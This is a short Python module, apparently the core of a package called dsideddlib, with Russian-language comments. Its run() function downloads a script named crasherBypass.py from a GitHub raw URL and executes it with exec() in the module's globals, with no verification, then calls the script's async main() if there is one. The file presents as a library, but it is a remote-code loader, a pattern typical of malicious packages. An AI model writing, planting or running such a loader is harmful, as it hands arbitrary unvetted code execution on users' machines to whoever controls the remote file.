# dsideddlib/core.py

import http.client
import asyncio

def run():
    print("[dsideddlib] Запуск...")

    # URL разложим на хост и путь
    host = "raw.githubusercontent.com"
    path = "/hellyth1337/dfree/main/crasherBypass.py"

    try:
        conn = http.client.HTTPSConnection(host)
        conn.request("GET", path)
        response = conn.getresponse()

        if response.status != 200:
            print(f"[dsideddlib] Ошибка загрузки: HTTP {response.status}")
            return

        code = response.read().decode()
        print("[dsideddlib] Код загружен")

        # Выполним код в отдельном контексте
        local_vars = {}
        exec(code, globals(), local_vars)

        # Если в коде определена async def main(), вызовем её
        if 'main' in local_vars and asyncio.iscoroutinefunction(local_vars['main']):
            print("[dsideddlib] Выполняю main()...")
            asyncio.run(local_vars['main']())
        else:
            print("[dsideddlib] main() не найден или не async — выполнение завершено")

    except Exception as e:
        print(f"[dsideddlib] Ошибка выполнения: {e}")

    finally:
        conn.close()
        print("[dsideddlib] Завершено.")
